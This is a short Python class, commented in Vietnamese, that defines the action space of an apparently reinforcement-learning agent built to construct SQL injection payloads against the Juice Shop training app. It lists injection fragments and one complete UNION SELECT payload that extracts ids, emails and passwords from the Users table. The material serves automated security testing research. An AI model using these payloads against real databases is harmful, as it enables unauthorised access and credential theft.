class ActionSpace:
    """
    Định nghĩa tất cả các "hành động" (payload fragments) mà Agent có thể thực hiện.
    """
    def __init__(self):
        # Bộ actions này được tùy chỉnh cho SQLite (dùng trong Juice Shop)
        # ----- CÁC HÀNH ĐỘNG CƠ BẢN -----
        self.actions = [
            "'", " ", ")", "(", "OR", "AND", "UNION", "SELECT",
            "FROM", "Users", "Products", "password", "email",
            "1=1", "1=0", "--", "NULL", ",", "*",
            "=''",  # Thường dùng để bypass
            "a", "b", # Các ký tự đệm (filler)
            "admin"
        ]
        
        # ----- CÁC "COMBO" ACTION MỚI ĐỂ GIÚP AGENT -----
        self.actions.append("'))")  # Close quote + paren
        
        # Combo để tìm số cột (9 columns, fit curl success)
        self.actions.append("NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL")  # 9 NULLs
        
        # Combo để chọn cột cụ thể (9 columns)
        self.actions.append("id,email,password,NULL,NULL,NULL,NULL,NULL,NULL")  # Map id/email/password + nulls
        
        # Combo payload hoàn chỉnh (siêu mạnh, với prefix 'a'))' để match LIKE '%a%')
        self.actions.append("a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--")

        self.actions.append("NULL,NULL")  # Partial nulls
        self.actions.remove("Products")  # Remove to anti-cheat

        self.num_actions = len(self.actions)

    def get_action_string(self, index):
        """Lấy chuỗi hành động từ chỉ số (index)."""
        return self.actions[index]

    def get_action_space_size(self):
        """Trả về tổng số hành động."""
        return self.num_actions